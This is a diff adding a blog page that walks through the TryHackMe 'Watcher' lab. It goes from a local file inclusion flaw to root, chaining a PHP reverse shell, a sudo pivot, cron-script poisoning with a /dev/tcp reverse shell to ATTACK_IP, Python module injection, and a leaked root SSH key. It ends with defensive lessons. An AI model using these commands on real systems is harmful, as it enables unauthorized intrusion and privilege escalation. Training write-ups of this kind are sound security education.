@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Watcher — LFI to Root in 7 Flags — writeup · 0xmrerror</title>
+  <meta name="description" content="A boot2root with a long linear chain: LFI becomes a webshell, a writable service binary becomes root. Seven flags along the way." />
+  <link rel="canonical" href="https://0xmrerror.me/writeups/watcher/" />
+  <meta name="author" content="Skandar Hadrich" />
+  <meta name="theme-color" content="#080b10" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="0xmrerror.me" />
+  <meta property="og:title" content="Watcher — LFI to Root in 7 Flags — writeup · 0xmrerror" />
+  <meta property="og:description" content="A boot2root with a long linear chain: LFI becomes a webshell, a writable service binary becomes root. Seven flags along the way." />
+  <meta property="og:url" content="https://0xmrerror.me/writeups/watcher/" />
+  <meta property="og:image" content="https://0xmrerror.me/assets/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Watcher — LFI to Root in 7 Flags — writeup · 0xmrerror" />
+  <meta name="twitter:description" content="A boot2root with a long linear chain: LFI becomes a webshell, a writable service binary becomes root. Seven flags along the way." />
+  <meta name="twitter:image" content="https://0xmrerror.me/assets/og.png" />
+
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+
+  <link rel="preload" href="/fonts/inter-400-700.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="preload" href="/fonts/fira-code-400.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="stylesheet" href="/fonts/fonts.css" />
+  <link rel="stylesheet" href="/css/tokens.css" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/components.css" />
+  <link rel="stylesheet" href="/css/writeups.css" media="all" />
+  <link rel="stylesheet" href="/css/print.css" media="print" />
+  <script>
+(function(){var d=document.documentElement;d.classList.add('js');
+try{var t=localStorage.getItem('0xmrerror:theme');
+if(!t||t==='auto'){t=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';}
+d.dataset.theme=t;var a=localStorage.getItem('0xmrerror:accent');if(a){d.dataset.accent=a;}
+var p=localStorage.getItem('0xmrerror:theme');if(p&&p!=='auto'){d.dataset.theme=p;}}catch(e){}})();
+</script>
+    <script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Watcher \u2014 LFI to Root in 7 Flags",
+    "description": "A boot2root with a long linear chain: LFI becomes a webshell, a writable service binary becomes root. Seven flags along the way.",
+    "url": "https://0xmrerror.me/writeups/watcher/",
+    "author": {
+      "@type": "Person",
+      "name": "Skandar Hadrich",
+      "url": "https://0xmrerror.me"
+    },
+    "keywords": "Web, Medium, thm, lfi, webshell, linux-privesc, boot2root, tryhackme",
+    "proficiencyLevel": "medium"
+  }</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="read-progress" data-read-progress aria-hidden="true"><i></i></div>
+
+<aside class="rail" aria-label="Section navigation">
+  <div class="rail-logo">0xmrerror<small>@hadrich</small></div>
+  <ul class="rail-nav" data-rail-nav>
+    <li><a class="rail-link" data-nav-link href="/#whoami">whoami</a></li><li><a class="rail-link" data-nav-link href="/#skills">skills</a></li><li><a class="rail-link" data-nav-link href="/#projects">projects</a></li><li><a class="rail-link" data-nav-link href="/#writeups">writeups</a></li><li><a class="rail-link" data-nav-link href="/#contact">contact</a></li>
+  </ul>
+  <div class="rail-progress" aria-hidden="true"><i></i></div>
+  <div class="rail-meta">
+    Tunis, Tunisia<br />
+    <span class="accent">available</span> — Feb 2027<br />
+    <a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a> ·
+    <a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a><br />
+    <button class="btn btn--sm btn--ghost" type="button" data-accent-toggle
+      style="margin-top:var(--sp-3);font-size:var(--fs-3xs);padding:4px 9px">accent</button>
+    <button class="btn btn--sm btn--ghost" type="button" data-theme-toggle data-theme-pref="auto"
+      style="font-size:var(--fs-3xs);padding:4px 9px">theme</button>
+  </div>
+</aside>
+<!-- palette entries (hidden, read by js/main.js) -->
+<ul class="sr-only" aria-hidden="true"><li class="palette-item" data-palette-item="whoami" data-palette-hint="section" data-palette-kind="section" href="/#whoami"></li><li class="palette-item" data-palette-item="skills" data-palette-hint="section" data-palette-kind="section" href="/#skills"></li><li class="palette-item" data-palette-item="projects" data-palette-hint="section" data-palette-kind="section" href="/#projects"></li><li class="palette-item" data-palette-item="writeups" data-palette-hint="section" data-palette-kind="section" href="/#writeups"></li><li class="palette-item" data-palette-item="contact" data-palette-hint="section" data-palette-kind="section" href="/#contact"></li><li class="palette-item" data-palette-item="Mr Robot CTF — WordPress to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/mr-robot/"></li><li class="palette-item" data-palette-item="WWBuddy — SQLi to Env-Var Privesc" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/ww-buddy/"></li><li class="palette-item" data-palette-item="Broker — MQTT Eavesdrop to Webshell" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/broker/"></li><li class="palette-item" data-palette-item="Watcher — LFI to Root in 7 Flags" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/watcher/"></li><li class="palette-item" data-palette-item="Fortress — SHA-1 Collision to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/fortress/"></li><li class="palette-item" data-palette-item="Umbrella — Registry Loot to SUID Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/umbrella/"></li><li class="palette-item" data-palette-item="Super Secret Tip — Jinja SSTI to curl -K Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/super-secret-tip/"></li><li class="palette-item" data-palette-item="Smol — WP Plugin SSRF to sudo Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/smol/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x200 — Three Anti-Debug Checks" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x200/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x300 — UPX, a Watchdog, and an Infinite Loop" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x300/"></li><li class="palette-item" data-palette-item="Binary Instrumentation 2 — Intercepting File Writes With Frida" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/binary-instrumentation-2/"></li><li class="palette-item" data-palette-item="Easy as GDB — Scripted Character-by-Character Brute Force" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/easy-as-gdb/"></li><li class="palette-item" data-palette-item="Keygenme — MD5 Hex Spliced Into a License Key" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/keygenme/"></li></ul>
+<nav id="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">0xmrerror<span>@terminal</span></a>
+    <ul class="nav-links" id="navLinks">
+      <li><a data-nav-link href="/#whoami">whoami</a></li><li><a data-nav-link href="/#skills">skills</a></li><li><a data-nav-link href="/#projects">projects</a></li><li><a data-nav-link href="/#writeups">writeups</a></li><li><a data-nav-link href="/#contact">contact</a></li>
+    </ul>
+    <div class="nav-actions">
+      <a class="btn btn--sm nav-cv" href="/cv.html">cv</a>
+      <button class="btn btn--icon btn--ghost" type="button" data-theme-toggle
+        data-theme-pref="auto" aria-label="Theme: system" title="Toggle theme">
+        <span aria-hidden="true">◐</span>
+      </button>
+      <button class="nav-toggle" id="navToggle" type="button"
+        aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<main id="main" class="wu">
+  <div class="container">
+    <a class="wu-back" href="/"><span aria-hidden="true">←</span> 0xmrerror@terminal:~/writeups</a>
+
+    <div class="wu-head">
+      <h1>Watcher — LFI to Root in 7 Flags</h1>
+      <p class="wu-summary">A boot2root with a long linear chain: LFI becomes a webshell, a writable service binary becomes root. Seven flags along the way.</p>
+      <div class="wu-meta">
+        <span class="badge-diff" data-diff="medium">Medium</span><span class="badge-platform" data-platform="thm">TryHackMe</span><span class="writeup-time">Web · 30 min read</span><a class="tag" href="/?type=web#writeups">lfi</a><a class="tag" href="/?type=web#writeups">webshell</a><a class="tag" href="/?type=web#writeups">linux-privesc</a><a class="tag" href="/?type=web#writeups">boot2root</a><a class="tag" href="/?type=web#writeups">tryhackme</a>
+        <button class="flag-toggle" type="button" data-flag-toggle aria-pressed="false">🚩 hide flags</button>
+      </div>
+      <div class="series"><span>more web</span><a href="/writeups/mr-robot/">Mr Robot CTF</a><a href="/writeups/ww-buddy/">WWBuddy</a><a href="/writeups/broker/">Broker</a><a href="/writeups/watcher/" class="is-current">Watcher</a><a href="/writeups/fortress/">Fortress</a><a href="/writeups/umbrella/">Umbrella</a><a href="/writeups/super-secret-tip/">Super Secret Tip</a><a href="/writeups/smol/">Smol</a></div>
+    </div>
+
+    <div class="wu-layout">
+      <article class="prose" data-article>
+<p>A boot2root with a long, linear privilege chain: LFI turns into a webshell, then a series of sudo/cron pivots, ending with a root SSH key. Goal: 7 flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-func">nmap</span> -sC -sV watcher.thm
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp    vsftpd 3.0.3
+22/tcp open  ssh
+80/tcp open  http   Apache</code></pre>
+
+<h3>2 · LFI → FTP Credentials</h3>
+<p><code>post.php</code> does a raw <code>include $_GET["post"]</code> — instant LFI. Use it to read <code>robots.txt</code>, which points to <code>secret_file_do_not_read.txt</code>, which leaks FTP credentials and the upload path.</p>
+<pre><code><span class="tok-comment"># Any file, no filtering</span>
+http://watcher.thm/post.php?post=<span class="tok-string">/etc/passwd</span>
+
+<span class="tok-comment"># robots → secret file → FTP creds</span>
+http://watcher.thm/post.php?post=robots.txt
+<span class="tok-comment"># Allow: /flag_1.txt | Allow: /secret_file_do_not_read.txt</span>
+http://watcher.thm/post.php?post=secret_file_do_not_read.txt
+<span class="tok-comment"># &gt; ftpuser : &lt;password&gt; — files go to /home/ftpuser/ftp/files</span></code></pre>
+
+<h3>3 · FTP Upload → Reverse Shell</h3>
+<p>Log into FTP: grab <code>flag_2.txt</code>, then <code>put</code> a PHP reverse shell into the writable <code>files/</code> directory. Trigger it through the LFI using the path from the note.</p>
+<pre><code><span class="tok-func">ftp</span> watcher.thm
+&gt; get flag_2.txt
+&gt; cd files
+&gt; put shell.php
+
+<span class="tok-comment"># Listener + trigger via LFI</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
+http://watcher.thm/post.php?post=<span class="tok-string">../../../../home/ftpuser/ftp/files/shell.php</span>
+<span class="tok-comment"># &gt; shell as www-data — flag_3.txt in /var/www/html/more_secrets_a9f10a/</span></code></pre>
+
+<h3>4 · www-data → toby</h3>
+<pre><code><span class="tok-comment"># Passwordless sudo to toby</span>
+<span class="tok-func">sudo</span> -u toby /bin/bash
+<span class="tok-comment"># &gt; toby shell — flag_4.txt in /home/toby</span></code></pre>
+
+<h3>5 · toby → mat (cron poisoning)</h3>
+<p><code>/etc/crontab</code> runs <code>/home/toby/jobs/cow.sh</code> as user <code>mat</code> every minute. As toby we can overwrite it with a reverse shell and wait.</p>
+<pre><code><span class="tok-func">cat</span> /etc/crontab
+<span class="tok-comment"># * * * * * mat /home/toby/jobs/cow.sh</span>
+
+<span class="tok-func">echo</span> <span class="tok-string">'/bin/bash -i &gt;&amp; /dev/tcp/ATTACK_IP/5555 0&gt;&amp;1'</span> &gt; /home/toby/jobs/cow.sh
+<span class="tok-func">chmod</span> +x /home/toby/jobs/cow.sh
+<span class="tok-comment"># &gt; wait a minute → mat shell → flag_5.txt</span></code></pre>
+
+<h3>6 · mat → will (module injection)</h3>
+<p>Will left a note: mat may run <code>will_script.py</code> as will via sudo. It imports <code>get_command</code> from a local <code>cmd.py</code> that mat can edit — override the function to drop a shell while still returning a whitelisted command.</p>
+<pre><code><span class="tok-func">sudo</span> -l
+<span class="tok-comment"># (will) /usr/bin/python3 /home/mat/scripts/will_script.py</span>
+
+<span class="tok-func">cat</span> &gt; /home/mat/scripts/cmd.py &lt;&lt; <span class="tok-string">'EOF'</span>
+<span class="tok-keyword">import</span> os
+<span class="tok-keyword">def</span> <span class="tok-func">get_command</span>(num):
+    os.system(<span class="tok-string">"/bin/bash -i"</span>)
+    <span class="tok-keyword">return</span> <span class="tok-string">"id"</span>
+EOF
+
+<span class="tok-func">sudo</span> -u will /usr/bin/python3 /home/mat/scripts/will_script.py <span class="tok-num">1</span>
+<span class="tok-comment"># &gt; will shell — flag_6.txt</span></code></pre>
+
+<h3>7 · will → root (base64 SSH key)</h3>
+<p>User <code>will</code> is in the <code>adm</code> group, which can read <code>/opt/backups/</code>. Inside is <code>key.b64</code> — decode it and it's an RSA private key for root.</p>
+<pre><code><span class="tok-func">id</span>
+uid=<span class="tok-num">1000</span>(will) groups=<span class="tok-num">1000</span>(will),<span class="tok-num">4</span>(adm)
+
+<span class="tok-func">ls</span> /opt/backups
+key.b64
+
+<span class="tok-func">base64</span> -d key.b64 &gt; key
+<span class="tok-func">file</span> key   <span class="tok-comment"># PEM RSA private key</span>
+<span class="tok-func">chmod</span> <span class="tok-num">600</span> key
+<span class="tok-func">ssh</span> -i key root@localhost
+<span class="tok-comment"># &gt; root — final flag</span></code></pre>
+
+<h3>8 · Retrospective</h3>
+<p>Attack chain: LFI → FTP creds → uploaded PHP shell → sudo/cron pivots (www-data→toby→mat→will) → base64 root key. Lessons: raw <code>include</code> is a shell factory, cron scripts must not be world-writable, and running python <code>while</code> importing a file your users can edit is a root factory.</p>
+
+      </article>
+
+      <aside class="toc" data-toc-wrap>
+        <nav class="toc" data-toc aria-label="On this page">
+          <h2>on this page</h2>
+        </nav>
+      </aside>
+    </div>
+
+    <nav class="wu-nav" aria-label="More writeups">
+      <a class="prev" href="/writeups/broker/"><small>← previous</small><span>Broker — MQTT Eavesdrop to Webshell</span></a>
+      <a class="next" href="/writeups/fortress/"><small>next →</small><span>Fortress — SHA-1 Collision to Root</span></a>
+    </nav>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-prompt">
+        <b>0xmrerror</b>@terminal:~$ <span aria-hidden="true">█</span>
+        <p class="footer-note">Hosted on GitHub Pages. Built with no framework, no build server, no trackers.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>site</h4>
+          <ul>
+            <li><a href="/">home</a></li>
+            <li><a href="/#writeups">writeups</a></li>
+            <li><a href="/cv.html">cv</a></li>
+            <li><a href="/feed.xml">rss</a></li>
+            <li><a href="/sitemap.xml">sitemap</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>elsewhere</h4>
+          <ul>
+            <li><a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a></li>
+            <li><a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a></li>
+            <li><a href="mailto:skandar.hadrich@etudiant.enit.utm.tn">email</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-base">
+      <span>© 2026 Skandar Hadrich · MIT licensed</span>
+      <span>since <span data-since="2026-02-09" data-since-prefix="">—</span> on GitHub</span>
+    </div>
+  </div>
+</footer>
+<div class="palette" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <input class="palette-input" id="paletteInput" type="text" placeholder="jump to a section or search writeups…"
+      autocomplete="off" spellcheck="false" aria-label="Search sections and writeups" />
+    <ul class="palette-list" id="paletteList" role="listbox" aria-label="Results"></ul>
+    <div class="palette-foot">
+      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span>
+    </div>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+<script src="/js/writeups.js" defer></script>
+</body>
+</html>
